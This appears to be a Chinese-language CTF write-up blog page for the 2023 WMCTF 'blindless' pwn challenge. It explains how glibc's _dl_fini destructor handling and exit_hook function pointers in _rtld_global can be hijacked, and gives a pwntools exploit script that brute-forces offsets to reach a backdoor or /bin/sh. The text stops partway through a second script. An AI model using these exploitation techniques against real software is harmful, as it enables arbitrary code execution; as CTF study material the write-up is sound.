@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
+    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
+    <meta name="description" content="blindlessgrxer@Ubuntu22 ~&#x2F;s&#x2F;m&#x2F;w&#x2F;blindless&gt; checksec main[*] &amp;#x27;&#x2F;mnt&#x2F;hgfs&#x2F;share&#x2F;match&#x2F;wmctf&#x2F;blindless&#x2F;main&amp;#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 WMCTF">
+<meta property="og:url" content="https://grxer.gitee.io/2023/08/28/2023wmctf/index.html">
+<meta property="og:site_name" content="Grxer&#39;s Blog">
+<meta property="og:description" content="blindlessgrxer@Ubuntu22 ~&#x2F;s&#x2F;m&#x2F;w&#x2F;blindless&gt; checksec main[*] &amp;#x27;&#x2F;mnt&#x2F;hgfs&#x2F;share&#x2F;match&#x2F;wmctf&#x2F;blindless&#x2F;main&amp;#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://grxer.gitee.io/2023/08/28/2023wmctf/image-20230831174521411.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/08/28/2023wmctf/image-20230831174746076.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/08/28/2023wmctf/image-20230831195723378.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/08/28/2023wmctf/image-20230901011053856.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/08/28/2023wmctf/image-20230901010937493.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/08/28/2023wmctf/image-20230830134733689.png">
+<meta property="article:published_time" content="2023-08-28T14:04:30.000Z">
+<meta property="article:modified_time" content="2023-10-01T05:17:13.306Z">
+<meta property="article:author" content="bxz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://grxer.gitee.io/2023/08/28/2023wmctf/image-20230831174521411.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2023 WMCTF</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 lrt">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/08/22/kernel-ret2dir/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/08/28/2023wmctf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&text=2023 WMCTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&title=2023 WMCTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&is_video=false&description=2023 WMCTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 WMCTF&body=Check out this article: https://grxer.gitee.io/2023/08/28/2023wmctf/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&title=2023 WMCTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&title=2023 WMCTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&title=2023 WMCTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&title=2023 WMCTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/08/28/2023wmctf/&name=2023 WMCTF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/08/28/2023wmctf/&t=2023 WMCTF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#blindless"><span class="toc-number">1.</span> <span class="toc-text">blindless</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dl-fini"><span class="toc-number">2.</span> <span class="toc-text">_dl_fini</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exit-hook"><span class="toc-number">3.</span> <span class="toc-text">exit_hook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2023 WMCTF
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">bxz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-08-28T14:04:30.000Z" itemprop="datePublished">2023-08-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="blindless"><a href="#blindless" class="headerlink" title="blindless"></a>blindless</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/m/w/blindless&gt; checksec main</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/wmctf/blindless/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>给了后门函数，executeBrainfuck函数可以根据输入的code，实现以malloc的data为基准的任意高地址写数据，data大小没有限制，可以mmap到libc固定偏移处</p>
+<h2 id="dl-fini"><a href="#dl-fini" class="headerlink" title="_dl_fini"></a>_dl_fini</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __libc_start_main(</span><br><span class="line">                <span class="type">int</span> (*main)(<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **MAIN_AUXVEC_DECL), <span class="comment">//参数: main函数指针</span></span><br><span class="line">                <span class="type">int</span> argc, <span class="type">char</span> **argv,                              <span class="comment">//参数: argc argv</span></span><br><span class="line">                ElfW(<span class="type">auxv_t</span>) * auxvec,</span><br><span class="line">                __typeof(main) init,     <span class="comment">//参数: init ELF的构造函数</span></span><br><span class="line">                <span class="type">void</span> (*fini)(<span class="type">void</span>),      <span class="comment">//参数: fini ELF的析构函数</span></span><br><span class="line">                <span class="type">void</span> (*rtld_fini)(<span class="type">void</span>), <span class="comment">//参数: rtld_fini ld的析构函数</span></span><br><span class="line">                <span class="type">void</span> *stack_end         <span class="comment">//参数: 栈顶</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/28/2023wmctf/image-20230831174521411.png" alt="image-20230831174521411"></p>
+<p>多个构造函数时存放在.init_array中，init(一般就是__libc_csu_init)就负责遍历.init_array来执行多个构造函数</p>
+<p>多个析构函数放在.fini_array中但是fini(一般是__libc_csu_fini)是个空函数</p>
+<p><img src="/2023/08/28/2023wmctf/image-20230831174746076.png" alt="image-20230831174746076"></p>
+<p>析构就由ld的析构函数 rtdl_fini负责，rdl_fini实际指向_dl_fini()函数，被编译到ld.so.2中</p>
+<p>ld.so.2会通过dl_open()把所需文件映射到进程空间中, 他会把所有映射的文件都记录在结构体**_rtld_global**中，进程终止, ld.so.2需要卸载所映射的模块, 这需要调用每一个非共享模块的fini_arrary段中的析构函数</p>
+<blockquote>
+<p>Linux Namespaces机制：namespace就是一个进程的集合, 这个进程集合中可以看到相同的全局资源</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span>//描述命名空间</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="comment">//每个模块用_ns_loaded描述, 这个命名空间中所映射的模块组成一个双向链表, _ns_loaded就是这个链表的指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line">        <span class="comment">/* _ns_loaded中有多少模块 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br></pre></td></tr></table></figure>
+
+<p>link_map *_ns_loaded 用来描述进程映射的一个模块</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf64_Addr l_addr;<span class="comment">/* 模块在内存中的的基地址 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *l_name;<span class="comment">/* 模块的文件名  */</span></span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_ld;<span class="comment">/* 指向ELF中的Dynamic节 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span><span class="comment">/* 双向链表指针 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span><span class="comment">/* 双向链表指针 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"> </span><br><span class="line">    Lmid_t l_ns; <span class="comment">/* 这个模块所属NameSapce的idx  */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"> </span><br><span class="line">    Elf64_Dyn *l_info[<span class="number">76</span>];  <span class="comment">//l_info 里面包含的就是动态链接的各个节的信息</span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> * l_phdr; <span class="comment">/* ELF的头表  */</span></span><br><span class="line">    ElfW(Addr) l_entry;        <span class="comment">/* ELF入口点  */</span></span><br><span class="line">    ElfW(Half) l_phnum;        <span class="comment">/* 头表中有多少节  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;        <span class="comment">/* dynamic节中有多少描述符  *</span></span><br><span class="line"><span class="comment">    .......</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword    d_tag;			<span class="comment">/* Dynamic entry type *64位程序占8bit 用于区分各种指定信息类型的标记，该结构中的共用体根据该标志进行解释/</span></span><br><span class="line"><span class="comment">  union</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;                     <span class="number">64</span>位程序占<span class="number">8b</span>it 或者保存一个虚拟地址，或者保存一个整数，可以根据特定的标志进行解释。</span><br><span class="line">&#125; Elf64_Dyn;</span><br><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT        12		<span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI        13		<span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAY	25		<span class="comment">/* Array with addresses of init fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAY	26		<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_INIT_ARRAYSZ	27		<span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DT_FINI_ARRAYSZ	28		<span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/28/2023wmctf/image-20230831195723378.png" alt="image-20230831195723378"></p>
+<p>_dl_fini遍历rtld_global中所有的命名空间，遍历命名空间中所有的模块，找到这个模块的fini_array段, 并调用其中的所有函数指针</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span><span class="comment">//有析构函数</span></span><br><span class="line">      || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">                &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">    _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">              DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">              ns);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)<span class="comment">//fini_array多个析构函数</span></span><br><span class="line">    &#123;</span><br><span class="line">      ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">        (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">      <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">        ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)<span class="comment">//fini析构函数</span></span><br><span class="line">    DL_CALL_DT_FINI</span><br><span class="line">      (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>.fini_array地址<code>l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>,同时控制l-&gt;l_info[DT_FINI_ARRAYSZ]大于0即可，执行.fini_arry里函数指针所指向的函数</p>
+<p>或者直接控制l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr，直接执行地址处函数</p>
+<p>l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr原本是指向</p>
+<p><img src="/2023/08/28/2023wmctf/image-20230901011053856.png" alt="image-20230901011053856"></p>
+<p>我们只需要修改l-&gt;l_addr使l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr+l-&gt;l_addr指向backdoor，同时l-&gt;l_info[DT_FINI_ARRAY]修改为0，即可</p>
+<blockquote>
+<p>另一种方法：调用析构函数时由于rdi是固定的地址(libc2.31为 _rtld_global+2312)，所以可以控制rdi为&#x2F;bin&#x2F;sh，fini为system地址或者把.fini_arry指向system got表</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">content</span>):</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res += <span class="string">b&#x27;.&#x27;</span> + p8(content[i]) + <span class="string">b&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># dbpie(&#x27;0x130E&#x27;)</span></span><br><span class="line">    <span class="comment"># dbpie(&#x27;0x001301&#x27;)</span></span><br><span class="line">    sla(<span class="string">b&#x27;ta size&#x27;</span>,<span class="string">b&#x27;1000000&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size&#x27;</span>,<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">    code=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7fe5e466f190</span>- <span class="number">0x7fe5e4357010</span>)+write(p32(<span class="number">0x3CB1</span>)[<span class="number">0</span>:<span class="number">2</span>])</span><br><span class="line">    code+=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7f30010c62a0</span>-<span class="number">0x7f30010c6190</span>-<span class="number">2</span>)+write(p64(<span class="number">0</span>))+<span class="string">b&#x27;q&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;code&#x27;</span>,code)</span><br><span class="line">    data=io.recvrepeat(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">      <span class="built_in">print</span>(data)</span><br><span class="line">      pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      io.close()</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/28/2023wmctf/image-20230901010937493.png" alt="image-20230901010937493"></p>
+<h2 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/15759130.html">exit_hook</a></h2><p>劫持rtld_global中的函数指针(一般时上锁解锁的函数)，调用关系 exit()–&gt;__run_exit_handlers–&gt;_dl_fini–&gt;rtld_lock_default_lock_recursive–&gt;rtld_lock_default_unlock_recursive</p>
+<p>其中<code>rtld_lock_default_lock_recursive</code>和<code>rtld_lock_default_unlock_recursive</code>来自于<code>_rtld_global</code>结构体</p>
+<p><img src="/2023/08/28/2023wmctf/image-20230830134733689.png" alt="image-20230830134733689"></p>
+<p>其中rtld_lock_default_lock_recursive和<code>rtld_lock_default_unlock_recursive</code>调用时参数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock))</span><br></pre></td></tr></table></figure>
+
+<p><code>GL(dl_load_lock)</code>也是从<code>_rtld_global</code>里取出来的值，即<code>_rtld_global._dl_load_lock.mutex</code>的地址</p>
+<blockquote>
+<p>libc和ld偏移通常第2字节处不一样，256种可能</p>
+</blockquote>
+<p>一种方法就是改<code>rtld_lock_default_lock_recursive</code>和<code>rtld_lock_default_unlock_recursive</code>其中一个为ogg</p>
+<p>或者改<code>rtld_lock_default_lock_recursive</code>和<code>rtld_lock_default_unlock_recursive</code>其中一个为system，改<code>_rtld_global._dl_load_lock.mutex</code>处为“&#x2F;bin&#x2F;sh\x00”	</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title 